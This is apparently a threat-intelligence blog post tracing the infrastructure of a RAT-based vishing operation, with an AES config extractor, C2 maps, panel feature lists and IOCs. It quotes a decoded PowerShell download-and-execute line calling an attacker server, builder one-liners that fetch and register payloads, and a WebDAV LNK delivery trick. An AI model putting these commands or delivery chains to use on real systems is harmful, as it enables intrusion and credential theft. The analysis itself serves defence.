---
title: "One Tweet, Sixteen Servers: Pivoting the Chopi RAT Vishing Operation"
description: "A WsgiDAV opendir gave me staging payloads and a leaked debug log. AES config RE confirmed all six C2 IPs and the full encrypted capability set. PE build timestamp forensics revealed two back-to-back build sessions; the operator's dropper cluster leaked their build-system path on VirusTotal. Neo4j graph of 70 nodes across 3 cloud providers. YARA rules included."
pubDate: "2026-06-30T12:00:00"
permalink: "/2026/06/30/chopi-rat-vishing-opendir-pivot/"
tags: ["Threat Intel", "RAT", "Vishing", "Infrastructure", "Reverse Engineering", "WebSocket", "Shodan", "YARA", "Neo4j", "AES"]
thumb: "/images/chopi-rat-vishing-opendir-pivot-infra-graph.png"
draft: false
---

[@smica83](https://x.com/smica83) posted a WsgiDAV opendir on X, tagged it `#opendir`, and moved on. I did not move on. What started as a passive sweep of eight files on an anonymous-write file share turned into sixteen servers across three cloud providers, a bespoke C2 framework nobody has named before, a call-centre CRM for managing vishing targets, a fake delivery company for cover, and a Coinbase phishing suite running in parallel. The operator also left their debug log on the server, so I know their workstation name and LAN IP.

Everything here was done passively. VT, Shodan, and a bit of Python. No contact with any live C2.

---

### What the opendir contained

The URL was `hxxp://65.20.107.242:8080/cloud/`. WsgiDAV 4.3.5 on port 8080, anonymous access, read-write. Shodan confirmed the access level in its cached banner: `Authenticated user: "anonymous", realm: "/", access: read-write`. Someone set this up and forgot to set a password.

Eight files in `/cloud/`:

- `IMG_96052.lnk` and `IMG_9765.lnk` — the delivery lures
- `netosh.ocx`, `mscomctl.ocx`, `mscomer.ocx` — the full RAT agents
- `stager.ocx` — a lightweight first-stage that uses `ix::HttpRequest` to pull a full agent
- `Screenshot_2026_05_20.jpg` and `_25.png` — decoy images to complete the social-engineering story
- `lg.txt` — the operator's own debug log, left in the payload directory

I collected all malware passively from VirusTotal by hash. The decoys were the only files I didn't pull.

The delivery chain for the lures uses Windows' WebDAV auto-mounting trick: the `.url` file contains a `file://65.20.107.242@8080/cloud/IMG_96052.lnk` target, which causes Explorer to mount the share and execute the `.lnk` without prompting. The LNK runs a `cmd /v /c` one-liner that uses delayed variable expansion to build and execute a command via character substitution, then drops the OCX into `%LOCALAPPDATA%\Packages\<random>.ocx.ocx` and calls `regsvr32 /s /i` to invoke `DllInstall`.

The debug log (`lg.txt`) was more useful than any of the malware. It contained the C2 IP (`65.20.100.95`), the operator's workstation hostname (`DESKTOP-ET51AJO`), their local username (`Bruno`), and their LAN address (`172.16.1.2`). Someone ran the agent on their own test box and left the output on the staging server.

---

### The payload: ixwebsocket C++ RAT (Chopi)

The OCX files are PE32+ x64 DLLs that export `DllInstall` and `DllRegisterServer`, making them loadable via `regsvr32 /s /i`. All full-agent builds share imphash `90e14895da9d91db91792548b613e56c` and weigh in at exactly 3,509,760 bytes. The first-stage (`stager.ocx`) is a different build at 3,088,896 bytes.

The agents are written in C++ and use the [ixwebsocket](https://github.com/machinezone/IXWebSocket) library for WebSocket communications. The C2 connects back over `ws://` on port 80. The config is not a plaintext or simple-XOR string; the C2 IP, port, and connection path are encrypted with AES-128-CBC, PKCS#7 padded, inside the binary.

Capabilities from string analysis: `cmd.exe /c` shell, `cred_exec` and `cred_logon` credential theft, Chrome credential and session theft via DevTools Protocol (`--remote-debugging-port`, `webSocketDebuggerUrl`, `cdp_*` handlers), lateral movement via remote scheduled tasks over RPC, and file upload. Internal component names are **Koki**, **Blat**, and **AgentThread**.

Persistence: `Software\Microsoft\Windows\CurrentVersion\Run` value named `WinComCtl`. WebSocket path: `/ws/agent`. User-agent: `Mozilla/5.0`. All agents share these strings (they are in the decrypted config, not plaintext in the binary).

---

### Cracking the AES config to extract C2 IPs

The debug log handed me one C2 IP, but the other agents had their configs encrypted. The good news was that the decrypt layout is identical across all builds, so one extractor script handles all of them.

The config uses AES-128-CBC. The key and IV aren't stored near the decrypt function. They sit at fixed offsets relative to the AES S-box in `.rdata`: the S-box is always at the first occurrence of `\x63\x7c\x77\x7b\xf2\x6b\x6f\xc5` in the file, the IV is 16 bytes at `sbox_va − 0x270`, and the key is 16 bytes at `sbox_va − 0x260`. Every config string is a separate 16-byte-aligned AES-CBC block, so the extractor just scans the whole image and keeps everything that decrypts to printable PKCS#7-padded plaintext.

```python
import pefile
from Crypto.Cipher import AES

AES_SBOX = bytes([0x63, 0x7c, 0x77, 0x7b, 0xf2, 0x6b, 0x6f, 0xc5])

def extract_config(pe_path):
    raw = open(pe_path, "rb").read()
    sbox_foff = raw.find(AES_SBOX)
    if sbox_foff == -1:
        return None, "no S-box"

    pe = pefile.PE(pe_path)
    ib = pe.OPTIONAL_HEADER.ImageBase
    # Map file offset → VA
    sbox_va = None
    for s in pe.sections:
        if s.PointerToRawData <= sbox_foff < s.PointerToRawData + s.SizeOfRawData:
            sbox_va = ib + s.VirtualAddress + (sbox_foff - s.PointerToRawData)
            break
    img = bytes(pe.get_memory_mapped_image(ImageBase=ib))
    pe.close()

    key = img[sbox_va - 0x260 - ib : sbox_va - 0x260 - ib + 16]
    iv  = img[sbox_va - 0x270 - ib : sbox_va - 0x270 - ib + 16]

    results = []
    for off in range(0, len(img) - 16, 16):
        ct = img[off : off + 16]
        if len(set(ct)) < 4:
            continue
        try:
            pt = AES.new(key, AES.MODE_CBC, iv).decrypt(ct)
            pad = pt[-1]
            if 1 <= pad <= 16:
                s = pt[:-pad]
                if all(32 <= b < 127 for b in s) and len(s) >= 3:
                    results.append(s.decode())
        except:
            pass
    return results, None
```

Running this across the samples gave me the complete C2 map. The extractor also decrypts every other config string in the binary, so I got the full capability list for free:

```
netosh.ocx      →  65.20.100.95       (port 80 — matches lg.txt)
mscomctl.ocx    →  65.20.107.242      (port 8080 — staging box also acts as C2)
mscomer.ocx     →  65.20.107.242      (port 8080)
dandan.ocx      →  65.20.112.222      (port 80)
tinystager.ocx  →  65.20.112.222      (port 80)
c07c.ocx        →  65.20.112.222      (port 80; self-identifies as "mscomctl.ocx")
stager.ocx      →  (tiny HTTP downloader, different config format, no S-box hit)
```

The decrypted config strings also expose the complete feature set — none of these were visible in plaintext strings: shell execution (`cmd.exe /Q`), screen and audio capture, keylogging, clipboard hijack, file list/upload/download/delete, process list/kill, persistence under `WinComCtl`, network scan (`net_arp_scan`, `net_port_scan`, `net_share_enum`), domain recon (`domain_users`, `domain_groups`, `domain_sessions`, `domain_trusts`), proxy tunneling, and the WebSocket endpoint `/ws/agent` with `Mozilla/5.0` as the agent UA.

Three C2 IPs: `65.20.100.95`, `65.20.107.242` (the staging server also takes commands), and `65.20.112.222` — a third node I hadn't seen yet. All three on Vultr, ASN 20473.

---

### Build timeline forensics: two sessions, one day before exposure

PE timestamps are spoofable, but when seven samples from the same campaign all carry plausible, internally consistent timestamps, they're worth reading. Every OCX agent has a `FILE_HEADER.TimeDateStamp` that groups cleanly into two build sessions:

```
Build session A — 2026-06-22 (UTC)
  dandan.ocx       09:54:00   → C2-C 65.20.112.222:80
  c07c.ocx         13:12:46   → C2-C 65.20.112.222:80
  stager.ocx       13:21:35   → C2-C 65.20.112.222:80   (9 min after c07c)
  tinystager.ocx   19:49:32   → C2-C 65.20.112.222:80

Build session B — 2026-06-29 (UTC)
  mscomer.ocx      11:54:04   → Staging-1 65.20.107.242:8080
  mscomctl.ocx     11:55:41   → Staging-1 65.20.107.242:8080   (97 sec later)
  netosh.ocx       11:56:21   → Staging-1 65.20.107.242:8080   (40 sec later)
```

Session A produced the C2-C agents and the lightweight `stager.ocx` on June 22nd. Session B produced the Staging-1 agents on June 29th — within a single two-minute burst. `netosh.ocx`, `mscomctl.ocx`, and `mscomer.ocx` were compiled in under 130 seconds. That's not a developer rebuilding one file; that's a build script iterating over a list of C2 targets and spitting out a new binary per target.

The staging server holding Session B's output was reported on June 30th — less than 24 hours after compilation. The operator built their payloads, deployed them to the anonymous-write WebDAV server, and left everything world-readable. Found the same day they went operational.

The two-session split also explains the C2 geography. June 22nd agents all beacon to Stockholm (C2-C `65.20.112.222`); June 29th agents split between Madrid-area and the original staging server. A new staging box and a new C2 group, stood up together, likely to separate campaigns by target geography or operator team.

---

### Shodan pivots: from three IPs to sixteen servers

With three C2 IPs, I queried Shodan for each. `65.20.112.222` was the most interesting. Port 80 returned a React SPA with the title **"Chopi — Monitoring Dashboard"** and the fingerprint `X-Powered-By: Express`. Port 3000 returned the same app (nginx on 80 proxies to Express on 3000). Chopi is the actor's custom C2 management interface — not anything public, not a framework I can find a GitHub repo for.

Searching Shodan for `http.title:"Chopi — Monitoring Dashboard"` returned seven results across five IPs:

| IP | provider | geo |
|---|---|---|
| `65.20.112.222` | Vultr | SE/Stockholm |
| `65.20.108.18` | Vultr | ES |
| `208.76.221.82` | Vultr | ES |
| `108.61.216.142` | Vultr | US/LA |
| — | — | — |

All on Vultr. The actor runs their entire C2 panel cluster on one provider.

`108.61.216.142` was the most loaded node: SSH on 22, Chopi on 80 and 8384, and a WsgiDAV 4.3.4 opendir on 8080 (a second staging server, `/cloud/` created 2026-06-17). That makes two anonymous-write staging boxes. VT flags this IP with 13 malicious votes, the highest in the cluster.

`208.76.221.82` had Chopi on 80 but something different on 443: **"SwiftDrop Deliveries"**, a fake delivery company website. The HTML comments read "Demo only — replace with your backend later" — a template that was deployed without customisation. The domain `threadedarbiter.net` resolves here, carrying a Sectigo DV certificate for it. The SwiftDrop lure is the social-engineering cover for vishing calls: "I'm calling from SwiftDrop about your delivery."

`65.20.108.18` had Chopi on 80 and 3000, and it also served `confrence.mp4` (misspelled — the actor dropped the second 'e') directly on port 80. VT showed two files communicating with this IP: `Screenshot_25_05_2026.lnk` and `morocco-conference.lnk`. The LNK names a conference theme; the payload URL matches (`65.20.108.18/confrence.mp4`). The LNK's PowerShell argument decodes to:

```text
$d='down your files';
IeX(&($d[11]+$d[2]+$d[8]) -useb http://65.20.108.18/confrence.mp4)
```

Character indexing into the string builds `iwr` (Invoke-WebRequest). The payload downloads and executes directly in memory, no disk drop. `morocco-conference.lnk` has 35 detections on VT (the highest of any lure in the set) and is dated around May 2026.

---

### Inside the Chopi panel: a feature inventory from the source

I managed to pull the panel's compiled JavaScript bundle (`index-Cm3zVjk-.js`, 322,350 bytes, sha256 `9d6ead50b7674cdd49e87a22214241a1bd4144954d2fab51aaf4a955526d6a6e`, build date 2026-06-22). All five Chopi nodes carry the same bundle, byte-for-byte. What follows is drawn entirely from static analysis of that single file.

The panel calls itself an **"Employee Monitoring Dashboard"** in its login subtitle — presumably the cover story if someone stumbles across the login page. Under that framing sits a full-featured C2 suite.

**REST API surface (30+ endpoints)**

```
/api/auth/status      /api/login            /api/logout
/api/audit            /api/logs
/api/build            /api/build/defaults   ← OCX agent compiler
/api/chrome/list      /api/chrome/save      /api/chrome/data/{id}
/api/ntlm/list        /api/ntlm/save        /api/ntlm/data/{id}
/api/socks/list       /api/socks/start/{id} /api/socks/stop/{id}
/api/agents/{id}/toggle-hidden
/api/browser/{back|forward|click|key|navigate|refresh|scroll|start|stop|type}
/api/deploy-phish     ← integrated phishing deployer
/api/files            /api/upload
/api/links            /api/visits           ← phishing link tracker (X-Admin-Key header)
/api/server/start     /api/server/stop      /api/server/schedule
/api/webdav/status    /api/webdav/{start|stop}
```

**Per-agent capabilities (from UI source strings)**

The operator dashboard presents a per-agent control surface with the following capabilities, quoted directly from the bundle:

- **Shell** — interactive CMD session
- **Screen capture** — configurable FPS (5/10/15/20/30) and quality (30/50/70/90)
- **Audio/clipboard/keylog** — real-time audio, clipboard surveillance, keystroke capture
- **File manager** — browse, download, upload, delete
- **Process list** — list and kill by PID
- **Chrome extraction** — *"Extracts passwords, cookies, cards, and tokens from all Chromium browsers on this machine."* Data categories: `["passwords","cookies","cards","tokens","ibans","history"]`. IBANs and payment cards are explicit targets.
- **Chrome launch** — *"Launches the user's real Chrome with their full profile — all saved logins, cookies, sessions, and extensions. Chrome will briefly restart on the agent's machine."* This maps to `chromelevator.ocx`, which kills Chrome, relaunches it with `--remote-debugging-port`, and exfiltrates via the DevTools Protocol.
- **NTLM/WPAD hash capture** — *"Registers WPAD via ADIDNS and starts an HTTP server that captures NTLMv2 hashes."* Maps to `wpad_capture.ocx`. No admin rights needed; ADIDNS write access (default for domain users) is sufficient. All captured hashes persist server-side across restarts.
- **Token theft** — steal process tokens for privilege escalation (`token_run`)
- **Credential exec** — `cred_exec` / `cred_logon` for pass-the-credential lateral movement
- **Auth Exec (SMB scheduled task)** — *"Connects to target via SMB with credentials, creates a scheduled task to run the command, captures output, and cleans up. Requires admin rights + ports 445 and 135 on target."*
- **Network recon** — ARP scan, port scan, SMB share enumeration. Default port-scan preset: `10,135,139,143,389,443,445,993,995,1433,3306,3389,5900,5985,8080,8443` — Windows/AD/database/RDP/management ports.
- **Active Directory** — `domain_users`, `domain_groups`, `domain_group_members`, `domain_computers`, `domain_sessions`, `domain_trusts`
- **HTTP proxy / SOCKS5** — route requests through the agent's network context
- **Remote browser control** — full browser automation (navigate, click, type, scroll, screenshot frames)

**Agent builder**

`/api/build` compiles a new OCX on demand. The UI surfaces three delivery options for each build:

```
1. Direct download link:    http://<host>:<port>/files/<filename>
2. PowerShell one-liner:    powershell -w hidden -c "iwr http://<host>/files/<f.ocx>
                              -OutFile $env:TEMP\<f.ocx>; regsvr32 /s /i $env:TEMP\<f.ocx>"
3. CMD one-liner:           curl -o %TEMP%\<f.ocx> http://<host>/files/<f.ocx>
                              && regsvr32 /s /i %TEMP%\<f.ocx>
```

The default filename in the builder UI is `mscomctl.ocx` — the same name carried by the agents on the staging server.

**ClickFix phishing generator**

`/api/deploy-phish` backs a built-in ClickFix generator with two Cloudflare impersonation templates — "Cloudflare Turnstile" (green checkmark, light background) and "Cloudflare Classic" (orange card). The flow: fake Turnstile checkbox → 2.5-second "Verifying…" delay → clipboard hijack via `document.execCommand('copy')` + `navigator.clipboard.writeText()` with the regsvr32 payload → "Action required" prompt → on `visibilitychange` (user has tabbed to Run dialog and pasted) → "Verified" confirmation screen. Payload is base64-encoded client-side; the default phishing domain is `secure-access.org` (registered May 2024, Gandi SAS — the oldest confirmed actor asset).

A **"Deploy to screenly.cam"** button appears in the builder, pointing to a separate tracking backend discussed in the next section.

**WebSocket vocabulary (60+ message types)**

The full operator-to-agent command surface runs over WebSocket. Partial listing of non-obvious types: `wpad_start/stop/hashes`, `token_run`, `remote_logon`, `monitor_list`, `browser_frame/status`, `chrome_extract/upload`, `domain_group_members/computers`, `proxy_request/response/error`, `new_audit`, `server_status`, `module_loaded`.

---

### trackgrid.net: the backbone domain

`65.20.108.18` also resolves to `thessa.trackgrid.net`. That subdomain hosts both `/ws/agent` (the WebSocket C2 endpoint) and `/auth/login.php` (the Chopi panel login). The registrar for `trackgrid.net` is Namecheap, with a withheldforprivacy.com shield and a Reykjavik, Iceland admin address.

Querying all `trackgrid.net` subdomains from VT returned ten: `thessa`, `crm`, `dollar`, `lamb`, `turtle`, `sheep`, `go`, `api`, `www`, and the apex. The interesting resolutions:

```
trackgrid.net          →  208.85.22.144  (mail server, FTP, DNS — full stack)
thessa.trackgrid.net   →  65.20.108.18   (staging-2 / C2 / Chopi panel)
crm.trackgrid.net      →  65.20.101.220  (Call Center CRM)
dollar.trackgrid.net   →  65.20.101.220  (same node)
lamb.trackgrid.net     →  208.85.18.237  (SSH only)
turtle.trackgrid.net   →  65.20.106.33   (SSH only)
sheep.trackgrid.net    →  70.34.215.224  (SSH only)
go.trackgrid.net       →  65.20.106.251  (no data)
```

`208.85.22.144` is running a full mail server: SMTP on 25, 465, 587, IMAP on 143, POP3 on 110, FTP on 21, and DNS on 53. The hostname on the box is `rginginternet.com`. This is not a staging server; it's the actor's communications infrastructure.

The SSH-only nodes (lamb, turtle, sheep, go) have no HTTP services indexed by Shodan. They are likely internal relay or build nodes. `65.20.106.33` has one VT malicious vote; `70.34.215.224` has one suspicious.

---

### The Call Center CRM

`crm.trackgrid.net` on port 443 serves a login page with the title "Login — Call Center CRM" and the subheading "Sign in to manage your leads and calls." This is not a metaphor. The actor is running a call centre, with operators logging in to manage a pipeline of targets.

The Contabo node (`mtdscrm.online`, `84.247.149.210`, Singapore) has a second CRM instance. The login form here is more polished, using a Shadcn-style design system, and the subheading reads "Enter your credentials to access your **agent dashboard**." The backend endpoint is `POST /auth/login`, which returns JSON and redirects to `/` on success. It also handles a `RECAPTCHA_REQUIRED` error for too many login attempts, meaning this is a production system with rate limiting.

`mtdscrm.online` was registered on 2025-04-27 through Namecheap, with a withheldforprivacy.com privacy shield and a Reykjavik, Iceland admin address. Same registrar, same privacy service, same location as `trackgrid.net`. These two domains share a registrant fingerprint.

The CRM's `/uploads/` directory was an open listing. It held 13 CSV import batches. A single batch contained 32,122 rows; across all 13 batches, the exposure runs to roughly 200,000 leads. The data schema stretches to 87 columns — PII, financials, and session-tracking fields:

```
email / firstname / lastname / phone / ip
deposit_amount / ftd_found_date / revenue / payout
brand / campaign / traffic_source / affiliate / sub_source
call_status / status / falcon_status
autologin_ip / autologin_user_agent
userAgent / device / browser
```

`autologin_ip` and `autologin_user_agent` imply the CRM can issue pre-authenticated session links for direct account takeover — the operator places the call, the victim clicks a link, and their account is already logged in.

Campaign names in the data: **Traffic Bank CPA**, **NX CPA**, **Crazy Ads CPA**, **Punch CRG**, **Fads CRG**. CPA (cost-per-acquisition) naming means someone is paying per successful fraud conversion. This is affiliate-model financial fraud running on top of the RAT.

Geographic spread across the CSV batches: GB, FR, CZ, PT, DE, CA, IT, US, AU, NZ, MX, CL, GT, PE, TR, IL — targeting is not regional; it's global.

The CRM backend PHP API exposes its own directory listing. Ten endpoints: `add_callback.php`, `add_comment.php`, `add_deposit.php`, `add_deposit.php`, `admin_import.php`, `click2call.php`, `delete_deposit.php`, `lead_preview.php`, `save_call_outcome.php`, `set_dial_prefix.php`, `update_lead_status.php`. The full call-centre workflow — dialling, outcome logging, deposit recording, click-to-call — is exposed without authentication gate on the directory itself.

The actor's workflow, as best I can reconstruct it:

1. Operators log into the CRM and pull a lead.
2. They call the target, presenting as SwiftDrop or a similar cover.
3. The target is social-engineered into clicking a `.url` lure or opening a `.lnk` file.
4. The ixwebsocket RAT installs itself, establishes a WebSocket C2 session, and the operator switches from the phone call to the Chopi dashboard.
5. Chrome credentials, saved payment cards, and IBANs are extracted. The deposit field in the CRM gets updated.

---

### The crypto-phishing lane

`108.61.216.142` (staging-3) also hosts a set of Coinbase-impersonation domains: `ceinbase.com`, `coinbrase.com`, `coinblase.com`, `loading-coinbase.com`, and login/accounts subdomains for each. Detection counts on VT run from 14 to 19 per domain. `ceinbase.com` was registered on 2024-02-14, making this campaign over two years old. Its WHOIS admin contact lists **Kuala Lumpur, Malaysia** — the same country origin as the original samples submitted by @smica83.

The crypto phishing and the RAT campaign appear to be parallel revenue streams from the same actor. The same Vultr server hosts staging payloads on port 8080 and fake Coinbase pages on port 443.

---

### SwiftDrop beyond Vultr

Searching Shodan for `http.title:"SwiftDrop Deliveries"` returned three instances:

| IP | provider | domain |
|---|---|---|
| `208.76.221.82` | Vultr ES | `threadedarbiter.net` |
| `164.90.188.208` | DigitalOcean DE | `blockresolver.com` |
| `206.81.25.27` | DigitalOcean DE | `simulationevaluator.org` |

The DigitalOcean nodes take the campaign beyond the Vultr cluster. `blockresolver.com` was registered 2026-02-04; `simulationevaluator.org` on 2026-02-12, through NameSilo, with QHoster nameservers. Neither domain has prior VT coverage. These are clean infrastructure nodes, stood up specifically for the lure.

---

### screenly.cam, a hardcoded admin key, and the teardown

The panel bundle contains five fetch calls to `https://screenly.cam`, all with the header `X-Admin-Key: ch0p1-adm1n`. The endpoints: `GET /api/links` (list tracking links), `POST /api/links` (create), `DELETE /api/links/{id}`, `GET /api/visits` (all victim clicks), `GET /api/visits/{id}` (per-link detail). `screenly.cam` is the actor's phishing-click tracking backend, named after its purpose — screen + camera, i.e. remote screen capture. The key `ch0p1-adm1n` is hardcoded in the public-facing bundle, meaning anyone who pulls the JS can query the tracking database if the domain comes back online.

The registrar for `screenly.cam` is Namecheap. Its nameservers are `dns1.registrar-servers.com` and `dns2.registrar-servers.com` — identical to `trackgrid.net`. Same Namecheap account, same name server delegation: conclusive operational link between the two domains.

`screenly.cam` was registered 2026-04-01. It was put on `server hold` + `client hold` (registry-level freeze) on **2026-06-22** — the same day the Chopi panel bundle was compiled. Something happened that day that prompted the actor to freeze their tracking backend and bake a new panel build. By 2026-06-30 the certificate had expired and the domain was unreachable.

**The teardown in real time**

The investigation took place on 2026-06-30. As recon progressed across the trackgrid.net subdomains, the infrastructure started going dark:

- **~15:20 UTC** — `crm.trackgrid.net`, `thessa.trackgrid.net`, `trackgrid.net` apex, and `www.trackgrid.net` all had their authoritative A records pulled within a 15-minute window. Public DNS returned SERVFAIL (resolver caches still held stale answers briefly); authoritative was already empty.
- **~15:35 UTC** — `65.20.97.79` (the `wavetracker.io` / `api.trackgrid.net` front-door, serving the actor's brand homepage) was reclaimed by Vultr. The same IP now serves a Google `*.google-analytics.com` certificate and a 404. The homepage content is gone — it was never archived by Wayback Machine.
- **~15:39 UTC** — `lg.txt` (the debug log that leaked DESKTOP-ET51AJO / Bruno / 172.16.1.2) returned HTTP 404 from the staging server. The one artefact that names a specific operator workstation was cleaned up during the session.

The actor pulled six DNS records and deleted the debug log in under 20 minutes while recon was active. `threadedarbiter.net` survived (different registrar, harder to touch quickly). The timeline suggests some form of infrastructure monitoring — either automated alerting on unusual DNS query volume or a human watching access logs on the staging server.

---

### The full infrastructure picture

<div style="border:1px solid #30363D;border-radius:8px;overflow:hidden;margin:1.5rem 0">
<iframe src="/infra-graph.html" width="100%" height="560" style="display:block;border:none;background:#0D1117" title="Chopi RAT infrastructure graph — interactive, zoomable"></iframe>
</div>

*Interactive graph: scroll to zoom, drag to pan, click a node to highlight its connections. [Open full screen →](/infra-graph.html)*

![Chopi RAT infrastructure graph — key nodes across Vultr, DigitalOcean, and Contabo, layered by functional role (static fallback)](/images/chopi-rat-vishing-opendir-pivot-infra-graph.png)

```text
DELIVERY
  IMG_*.url ──WebDAV──► 65.20.107.242:8080/cloud/ ──regsvr32──► OCX agent
  morocco-conference.lnk ──PS iwr──► 65.20.108.18/confrence.mp4 ──► OCX agent

STAGING (anonymous read-write WebDAV)
  65.20.107.242:8080  (Vultr ES)   WsgiDAV 4.3.5, original opendir
  108.61.216.142:8080 (Vultr US)   WsgiDAV 4.3.4, /cloud/ created 2026-06-17

C2 (WebSocket ws://)
  65.20.100.95:80   ← netosh.ocx           (log-confirmed)
  65.20.107.242:8080 ← mscomctl, mscomer   (staging = C2)
  65.20.112.222:80  ← dandan, tinystager, c07c, stager
  thessa.trackgrid.net/ws/agent ← confrence.mp4 agent

CHOPI PANEL (React/Express/Node.js)
  65.20.112.222:80,3000    65.20.108.18:80,3000
  208.76.221.82:80         108.61.216.142:80,8384

CALL CENTER CRM
  crm.trackgrid.net → 65.20.101.220 (Vultr ES, Bootstrap 5)
  mtdscrm.online    → 84.247.149.210 (Contabo SG, Shadcn)

LURE SITES (SwiftDrop Deliveries, fake delivery co.)
  threadedarbiter.net → 208.76.221.82    (Vultr ES)
  blockresolver.com   → 164.90.188.208   (DigitalOcean DE)
  simulationevaluator.org → 206.81.25.27 (DigitalOcean DE)

MAIL + DNS INFRA
  208.85.22.144 (Vultr ES) = trackgrid.net apex + rginginternet.com
  SMTP/IMAP/POP3/FTP/DNS all present

CRYPTO PHISHING
  ceinbase.com / coinbrase.com / coinblase.com / loading-coinbase.com
  hosted on 108.61.216.142 (det 14–19/91)

BENCH NODES (SSH only, trackgrid.net subdomains)
  lamb.  208.85.18.237   turtle. 65.20.106.33
  sheep. 70.34.215.224   go.     65.20.106.251

OPERATOR LEAK
  hostname: DESKTOP-ET51AJO   user: Bruno   LAN: 172.16.1.2
  (from lg.txt left in /cloud/ on staging-1)
```

Sixteen IPs across three providers (Vultr primary, DigitalOcean secondary, Contabo tertiary). Registered 2025-04-27 to 2026-02-12. `trackgrid.net` and `mtdscrm.online` share a Namecheap plus withheldforprivacy.com plus Reykjavik registration fingerprint that ties them to the same person.

---

### Attribution notes

I'm not going to put a flag on this. The Malaysia overlap (sample origin, `ceinbase.com` WHOIS) is real but not conclusive — Kuala Lumpur privacy-service addresses are common in the regional threat ecosystem, and VT submitter location tells you where the sample was seen, not necessarily where the operator sits.

What the `ceinbase.com` CT certificate history does establish is that this operation is older than the RAT campaign suggests. The domain's first certificate was issued in **April 2018** — not 2024. Fifty-two distinct subdomains across 155 certificates ran from 2018 through early 2025. Among those subdomains: `painel` (Portuguese for "panel"), `akunting` and `absensi` (Indonesian for "accounting" and "attendance"). Indonesian and Lusophone language markers in the admin interface naming point toward a Southeast Asian or Lusophone operator, or a team spanning both. That's consistent with a Malaysia-primary operation with Portuguese-speaking affiliates (Brazil, Portugal) handling some administration.

The `wavetracker.io` brand domain (registered 2025-12-10) predates `trackgrid.net` (2025-12-23) by 13 days. The operator built the public-facing brand name first and the backend second — a product-development mindset, not a throwaway campaign. `secure-access.org`, the ClickFix default phishing domain, was registered in May 2024 through Gandi SAS (France) — the oldest currently-active asset in the infrastructure and the fifth distinct registrar in the actor's stack (Namecheap, OwnRegistrar, GMO/Onamae, WEBCC, Gandi). That deliberate registrar diversification is an operational choice to complicate simultaneous takedown across jurisdictions.

The teardown behaviour observed during this investigation — DNS records pulled in real time, debug log deleted within minutes of recon activity — suggests the actor is running active monitoring on their infrastructure, not just passive. A group that has been operating since 2018, manages 1,000+ fraud domains across multiple affiliate campaigns, and built a custom C2 framework with an integrated ClickFix generator and OCX agent compiler does not stumble into operational security. The debug log leak and the anonymous-write WebDAV were mistakes. The teardown response was not.

The Chopi C2 framework, the consistent Vultr preference, and the Namecheap/Reykjavik registration pattern are the strongest clustering signals. If you have samples that reach `trackgrid.net`, `screenly.cam`, or carry the Chopi panel fingerprint (`http.title:"Chopi — Monitoring Dashboard"`, ETag `W/"241-19eef4cae15"`), they likely belong to this cluster.

---

### IOCs

```
# IPs — Vultr AS20473
65.20.107.242     staging-1 (WsgiDAV :8080)
65.20.100.95      C2-B (ws :80)
65.20.100.96      probable sibling
65.20.112.222     C2-C (ws :80) + Chopi panel
65.20.108.18      staging-2 / C2 (thessa.trackgrid.net) + Chopi panel
108.61.216.142    staging-3 (WsgiDAV :8080) + Chopi panel + crypto phishing
208.76.221.82     Chopi panel + SwiftDrop lure (threadedarbiter.net)
208.85.22.144     mail infra (trackgrid.net / rginginternet.com)
65.20.101.220     Call Center CRM-1 (crm.trackgrid.net)
208.85.18.237     lamb.trackgrid.net (SSH)
65.20.106.33      turtle.trackgrid.net (SSH)
70.34.215.224     sheep.trackgrid.net (SSH)
65.20.106.251     go.trackgrid.net

# IPs — DigitalOcean AS14061
164.90.188.208    SwiftDrop lure (blockresolver.com)
206.81.25.27      SwiftDrop lure (simulationevaluator.org)

# IPs — Contabo AS141995
84.247.149.210    Call Center CRM-2 (mtdscrm.online)

# Domains — C2 / infra
trackgrid.net            backbone (Namecheap, Reykjavik, 2025-12-23)
thessa.trackgrid.net     ws C2 + Chopi panel
crm.trackgrid.net        Call Center CRM-1
mtdscrm.online           Call Center CRM-2 (Namecheap, Reykjavik, 2025-04-27)
wavetracker.io           brand domain / front-door (Namecheap/Iceland, 2025-12-10) → 65.20.97.79
screenly.cam             click-tracking backend (Namecheap, 2026-04-01; frozen 2026-06-22)
rginginternet.com        mail server alias

# Domains — lure / phishing
threadedarbiter.net      SwiftDrop lure
blockresolver.com        SwiftDrop lure (2026-02-04)
simulationevaluator.org  SwiftDrop lure (2026-02-12)
secure-access.org        ClickFix phishing default (Gandi SAS, 2024-05-21; oldest active asset)
ceinbase.com             Coinbase phishing (KL Malaysia, 2024-02-14; CT history to 2018-04)
coinbrase.com            Coinbase phishing
coinblase.com            Coinbase phishing
loading-coinbase.com     Coinbase phishing

# Samples — RAT agents (imphash 90e14895da9d91db91792548b613e56c)
# Build session A — 2026-06-22 (all beacon to C2-C 65.20.112.222:80)
e6f6c76c9c7a4affa2cca49471956c653c90f0433a12dd9ed1491c419103412b  dandan.ocx      (ts 09:54)
c07c6a4b9041fddcab3b0f695437a7eb081f9d2ed551e87b32a774348c64b164  c07c.ocx        (ts 13:12)
55a51eedb4357c2d8809fc5be2d0c57535851a16f07dbc744dc71678d3bce7e7  stager.ocx      (ts 13:21, imphash 1bf5f1b7...)
7877b4987c91fa354071583b215ff702d36bbc7027846074d8e864196cc042f5  tinystager.ocx  (ts 19:49)
# Build session B — 2026-06-29 11:54–11:56 UTC (all compiled within 130 seconds)
55eb96cdf5d424448bbec4c6a3764576ffeda2629f5d213796e14f1c26bfe7ab  mscomer.ocx     (C2: 65.20.107.242:8080)
9a8f9549d62aa43565db745f4d2870dec281c17bba61f5599146f166b72a4b62  mscomctl.ocx    (C2: 65.20.107.242:8080)
fbcafc60b1ed966ee7ac0405f126e2035d49e82b90ebf276599c5cef86f0c4ac  netosh.ocx      (C2: 65.20.100.95:80)

# Samples — lures
c1e34b2863d328ef2f8d8ff9d5acaaf0d4ea6095bfd633cb321542486356a9e8  morocco-conference.lnk
a232f568b4a04e9a...  Screenshot_25_05_2026.lnk

# Operator artefact
hostname: DESKTOP-ET51AJO   user: Bruno   LAN: 172.16.1.2

# Chopi panel fingerprint (Shodan)
http.title:"Chopi — Monitoring Dashboard"
ETag: W/"241-19eef4cae15"

# Panel bundle (all 5 nodes carry identical build)
index-Cm3zVjk-.js   sha256 9d6ead50b7674cdd49e87a22214241a1bd4144954d2fab51aaf4a955526d6a6e
                    build date: 2026-06-22 / 322,350 bytes

# Hardcoded credential in panel bundle
X-Admin-Key: ch0p1-adm1n  (screenly.cam admin API, 5 call sites in bundle)

# Shared RAT config
WS path: /ws/agent   UA: Mozilla/5.0
